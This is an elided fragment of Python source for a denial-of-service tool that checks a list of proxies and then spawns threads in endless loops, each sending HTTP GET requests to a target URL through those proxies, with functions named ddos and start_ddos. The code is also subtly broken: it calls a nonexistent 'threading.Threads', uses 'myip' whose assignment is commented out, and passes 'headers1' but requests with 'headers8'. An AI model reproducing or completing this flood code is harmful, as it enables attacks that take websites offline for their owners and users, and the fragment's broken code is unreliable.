...
def check_prox(array, url):
        #myip = r.post(random.choice(iphosts)).text
        for prox in array:
                th = threading.Thread(target=check, args=(myip, prox, url))
                th.start()
...
def check(myip, prox, url):
        try:
                ...
                if ipx == myip:
                        ...
                        th = threading.Threads(target=ddos, args=(prox, url))
                        th.start()
...
def ddos(prox, url):
        ...
        while True:
                ...
                th = threading.Thread(target=start_ddos, args=(prox, url, headers1, proxies, color))
                th.start()

def start_ddos(prox, url, headers1, proxies, color):
        try:
                s1 = r.Session()
                req1 = s1.get(url, headers=headers8, proxies=proxies)
